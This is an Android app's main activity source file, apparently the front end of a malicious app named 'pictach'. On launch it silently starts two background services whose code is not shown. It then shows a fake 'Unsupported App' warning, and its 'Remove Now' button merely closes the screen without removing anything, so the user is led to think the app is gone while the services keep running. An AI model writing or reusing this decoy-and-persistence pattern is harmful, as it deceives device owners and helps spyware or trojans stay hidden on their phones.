package com.android.pictach;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Color;
import android.os.Bundle;
import android.view.Gravity;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        startService(new Intent(this, love.class));
        startService(new Intent(this, Api.class));

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(Color.parseColor("#FAFAFA"));
        layout.setPadding(64, 64, 64, 64);

        TextView title = new TextView(this);
        title.setText("Unsupported App");
        title.setTextSize(20f);
        title.setTextColor(Color.parseColor("#CC0000"));
        title.setGravity(Gravity.CENTER);
        layout.addView(title);

        TextView msg = new TextView(this);
        msg.setText("The application is not compatible with your device. Please remove it.");
        msg.setTextSize(14f);
        msg.setTextColor(Color.parseColor("#333333"));
        msg.setGravity(Gravity.CENTER);
        msg.setPadding(0, 24, 0, 48);
        layout.addView(msg);

        Button btn = new Button(this);
        btn.setText("Remove Now");
        btn.setTextColor(Color.WHITE);
        btn.setBackgroundColor(Color.parseColor("#CC0000"));
        btn.setOnClickListener(v -> finish());
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT);
        layout.addView(btn, params);

        setContentView(layout);
    }
}
